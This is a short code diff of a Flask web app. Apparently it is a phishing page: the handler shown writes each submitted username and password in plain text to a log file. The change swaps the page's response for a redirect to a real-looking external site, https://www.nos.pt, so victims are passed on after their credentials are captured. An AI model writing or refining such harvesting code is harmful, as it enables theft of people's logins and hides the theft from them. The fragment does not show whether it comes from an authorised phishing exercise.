@@ -12,7 +12,7 @@ def handle_data():
     password = request.form['password']
     with open('user_log.txt', '+a') as user_log:
         user_log.write(user + ': ' + password + '\n')
-    return render_template('sso.html')
+    return redirect("https://www.nos.pt", code=302)
 
 @app.route('/login')
 def login():
